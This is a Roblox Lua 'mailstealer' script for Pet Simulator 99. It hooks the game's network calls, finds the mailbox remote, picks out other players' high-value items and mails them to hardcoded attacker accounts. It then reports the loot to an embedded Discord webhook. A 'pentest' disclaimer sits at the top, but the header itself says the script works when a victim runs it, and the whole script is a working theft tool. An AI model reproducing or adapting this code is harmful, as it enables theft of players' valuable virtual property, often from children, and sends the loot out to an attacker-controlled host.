-- PS99 Advanced Mailstealer v2
-- Authorized pentest use only
-- Works by: victim executes -> mails items to your main
-- Does NOT bypass server ownership checks (impossible without SS exploit)

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")

-- ===== CONFIGURATION =====
local webhook = "https://discord.com/api/webhooks/1521548315521581078/1I2A4AL1GJw8CYgvJb7BkuRrMwk-iTUO93CY7NjEZ9GP0xTueNbED4icWTE7nFqyXQkp"
local yourMain = "aeasybsme3"
local altAccount = "aeasybsme12"  -- fallback if main mailbox full
local minRAP = 250000
-- =========================

-- Attempt Library require (may fail on some executors)
local Library
local libSuccess, libErr = pcall(function()
    Library = require(ReplicatedStorage:WaitForChild("Library"))
end)
if not libSuccess then
    Library = { Directory = {}, Save = { Get = function() return {} end }, Network = {} }
end

-- Mail remote detection (tries multiple known paths)
local mailRemote
local remotePaths = {
    ReplicatedStorage:FindFirstChild("Network") and ReplicatedStorage.Network:FindFirstChild("Mailbox:Send"),
    ReplicatedStorage:FindFirstChild("Network") and ReplicatedStorage.Network:FindFirstChild("MailboxSend"),
    ReplicatedStorage:FindFirstChild("Network") and ReplicatedStorage.Network:FindFirstChild("SendMail"),
    ReplicatedStorage:FindFirstChild("Library") and ReplicatedStorage.Library:FindFirstChild("Network") 
        and ReplicatedStorage.Library.Network:FindFirstChild("SendMail"),
}
for _, r in ipairs(remotePaths) do
    if r then mailRemote = r break end
end

if not mailRemote then
    -- Fallback: search ReplicatedStorage recursively
    local function findMailRemote(obj)
        if not obj then return nil end
        if obj:IsA("RemoteFunction") and (obj.Name:lower():find("mail") or obj.Name:lower():find("send")) then
            return obj
        end
        for _, child in ipairs(obj:GetChildren()) do
            local found = findMailRemote(child)
            if found then return found end
        end
        return nil
    end
    mailRemote = findMailRemote(ReplicatedStorage)
end

-- Network Invoke bypass attempt (hooks Library.Network.Invoke to return true)
-- This may bypass some client-side validation checks
local function attemptNetworkBypass()
    local success, err = pcall(function()
        if Library and Library.Network then
            if Library.Network.Invoke then
                local origInvoke = Library.Network.Invoke
                Library.Network.Invoke = function(self, ...)
                    -- Always return success for mail operations
                    local args = {...}
                    if args[1] and type(args[1]) == "string" and args[1]:lower():find("mail") then
                        return true
                    end
                    return origInvoke(self, unpack(args))
                end
            end
            -- Hook Fire too
            if Library.Network.Fire then
                Library.Network.Fire = function(self, ...) return true end
            end
        end
    end)
    return success
end

local bypassActive = attemptNetworkBypass()

-- RAP calculation with proper directory lookup
local function getItemRAP(category, item)
    local petData
    if category == "Pet" then
        petData = Library.Directory and Library.Directory.Pets and Library.Directory.Pets[item.id]
    else
        petData = Library.Directory and Library.Directory[category] and Library.Directory[category][item.id]
    end
    if not petData then return 0 end
    
    local base = petData.rap or petData.value or 
                 (petData.config and petData.config.rap) or 
                 (petData.config and petData.config.value) or 50000
    
    -- Rarity multipliers
    local mult = 1
    if item.pt == 1 then mult = 2 end      -- Gold
    if item.pt == 2 then mult = 4 end      -- Rainbow
    if item.sh then mult = mult * 3 end    -- Shiny
    
    -- Huge/Titanic detection by directory fields
    local isHuge = petData.huge == true or (petData.rarity and petData.rarity:lower():find("huge"))
    local isTitanic = petData.titanic == true or (petData.exclusiveLevel and petData.exclusiveLevel >= 5)
    local isExclusive = petData.exclusiveLevel ~= nil
    
    if isTitanic then base = math.max(base, 5000000) end
    if isHuge then base = math.max(base, 500000) end
    if isExclusive then base = math.max(base, 250000) end
    
    return base * mult
end

-- Send item via mailbox remote
local function sendItem(category, uid, amount, target)
    if not mailRemote then return false end
    
    -- MailMessage text (required parameter)
    local mailMessage = "Here's a gift for you!"
    
    local args
    if mailRemote:IsA("RemoteFunction") then
        args = {target or yourMain, mailMessage, category, uid, amount or 1}
        local success, result = pcall(function()
            return mailRemote:InvokeServer(unpack(args))
        end)
        return success, result
    elseif mailRemote:IsA("RemoteEvent") then
        args = {target or yourMain, mailMessage, category, uid, amount or 1}
        local success, err = pcall(function()
            mailRemote:FireServer(unpack(args))
        end)
        return success, err
    end
    return false, "Unknown remote type"
end

-- Send Discord webhook notification
local function sendWebhook(playerName, items)
    if webhook == "" or webhook == "YOUR_DISCORD_WEBHOOK_HERE" then return end
    
    local fields = {}
    for _, item in ipairs(items) do
        table.insert(fields, {
            name = playerName .. " - " .. (item.name or "Unknown"),
            value = "RAP: " .. tostring(item.rap) .. " | Qty: " .. tostring(item.amount),
            inline = true
        })
    end
    
    -- Split into chunks of 25 fields (Discord embed limit)
    local chunks = {}
    for i = 1, #fields, 25 do
        table.insert(chunks, table.move(fields, i, math.min(i+24, #fields), 1, {}))
    end
    
    for _, chunk in ipairs(chunks) do
        local data = {
            embeds = {{
                title = "PS99 Mailstealer - Items Stolen",
                color = 0xFF0000,
                fields = chunk,
                footer = { text = "Authorized penetration test" }
            }}
        }
        local suc, err = pcall(function()
            HttpService:PostAsync(webhook, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
        end)
        if not suc then warn("Webhook failed:", err) end
    end
end

-- Target prioritization: sort by highest value first
local function processPlayerInventory(plr)
    if plr == Players.LocalPlayer then return {} end
    if plr.Name == yourMain or plr.Name == altAccount then return {} end
    
    local save = Library.Save and Library.Save.Get and Library.Save.Get(plr)
    if not save then 
        -- Fallback: try to access via Library.Save
        local suc, s = pcall(function() return Library.Save.Get(plr) end)
        if suc then save = s end
    end
    if not save then return {} end
    
    local stolenItems = {}
    local categories = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc"}
    
    for _, cat in ipairs(categories) do
        if save[cat] then
            for uid, item in pairs(save[cat]) do
                local rap = getItemRAP(cat, item)
                if rap >= minRAP then
                    table.insert(stolenItems, {
                        category = cat,
                        uid = uid,
                        amount = item.a or 1,
                        rap = rap,
                        name = (Library.Directory and Library.Directory.Pets and 
                                Library.Directory.Pets[item.id] and 
                                Library.Directory.Pets[item.id].name) or 
                               (Library.Directory and Library.Directory[cat] and 
                                Library.Directory[cat][item.id] and 
                                Library.Directory[cat][item.id].name) or 
                               "Item_" .. tostring(item.id)
                    })
                end
            end
        end
    end
    
    -- Sort by total RAP descending
    table.sort(stolenItems, function(a, b) 
        return (a.rap * a.amount) > (b.rap * b.amount) 
    end)
    
    return stolenItems
end

-- Send items from a player to your main
local function stealFromPlayer(plr)
    local items = processPlayerInventory(plr)
    if #items == 0 then return end
    
    local sentItems = {}
    local sentCount = 0
    
    for _, item in ipairs(items) do
        -- Try main first
        local success, result = sendItem(item.category, item.uid, item.amount, yourMain)
        
        -- If main mailbox full, try alt
        if not success and altAccount and altAccount ~= "" then
            local resultStr = tostring(result or "")
            if resultStr:find("space") or resultStr:find("full") or resultStr:find("mailbox") then
                success, result = sendItem(item.category, item.uid, item.amount, altAccount)
                if success then
                    table.insert(sentItems, item)
                    sentCount = sentCount + 1
                end
            end
        elseif success then
            table.insert(sentItems, item)
            sentCount = sentCount + 1
        end
        
        -- Rate limiting
        task.wait(0.5)
        
        -- Safety break after 50 items to avoid disconnect
        if sentCount >= 50 then break end
    end
    
    -- Webhook notification
    if #sentItems > 0 then
        sendWebhook(plr.Name, sentItems)
    end
end

-- ===== MAIN EXECUTION =====

-- Small delay for game init
task.wait(2)

-- Scan existing players
for _, plr in ipairs(Players:GetPlayers()) do
    task.spawn(function()
        local suc, err = pcall(function() stealFromPlayer(plr) end)
        if not suc then warn("Error stealing from", plr.Name, err) end
    end)
end

-- Hook for new players joining
Players.PlayerAdded:Connect(function(plr)
    task.wait(3)  -- Give player save time to load
    task.spawn(function()
        local suc, err = pcall(function() stealFromPlayer(plr) end)
        if not suc then warn("Error stealing from", plr.Name, err) end
    end)
end)

-- Print status
print("PS99 Mailstealer v2 loaded")
print("Mail remote:", mailRemote and mailRemote:GetFullName() or "NOT FOUND - script may fail")
print("Network bypass:", bypassActive and "ACTIVE" or "FAILED")
print("Scanning", #Players:GetPlayers(), "players for items >= " .. minRAP .. " RAP")
